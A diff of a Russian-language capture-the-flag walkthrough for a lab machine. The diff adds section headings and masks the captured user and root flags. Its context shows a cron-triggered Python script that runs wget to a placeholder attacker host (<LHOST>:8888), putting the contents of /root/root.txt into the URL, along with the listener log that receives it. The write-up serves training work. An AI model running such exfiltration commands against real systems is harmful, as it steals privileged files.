@@ -164,11 +164,11 @@ sun@sun:~$ uname -a
 Linux sun 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
+## user.txt
 Заберем флаг пользователя:
 ```
 sun@sun:~$ cat /home/sun/Documents/user.txt
-
-00ff00ff00ff00ff00ff00ff00ff00ff
+9a093cd2????????????????????????
 ```
 
 И обдумаем PrivEsc-план. Для начала посмотрим, что в домашнем каталоге:
@@ -316,11 +316,11 @@ root@sun:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+### root.txt
 После этого можно забирать флаг:
 ```
 root@sun:~# cat /root/root.txt
-
-ff00ff00ff00ff00ff00ff00ff00ff00
+ba1d0019????????????????????????
 ```
 
 И в качестве бонуса посмотреть задание crontab'а:
@@ -368,11 +368,12 @@ Serving HTTP on 0.0.0.0 port 8888 ...
 sun@sun:~$ echo 'import os;os.system("wget http://<LHOST>:8888/$(cat /root/root.txt)");print "f4ckU!"' > Documents/script.py
 ```
 
+### root.txt
 Ждем ⩽ 5 минут, и, о чудо:
 ```
 Serving HTTP on 0.0.0.0 port 8888 ...
 10.10.10.85 - - [24/Aug/2018 22:25:02] code 404, message File not found
-10.10.10.85 - - [24/Aug/2018 22:25:02] "GET /ba1d0019200a54e370ca151007a8095a HTTP/1.1" 404 -
+10.10.10.85 - - [24/Aug/2018 22:25:02] "GET /ba1d0019???????????????????????? HTTP/1.1" 404 -
 ```
 
 Мы спровоцировали ошибку, получив при этом содержимое нужного файла. Полюбуемся теперь на собственное хулиганство (и одновременно доказательство того, что скрипт успешно отработал до конца):
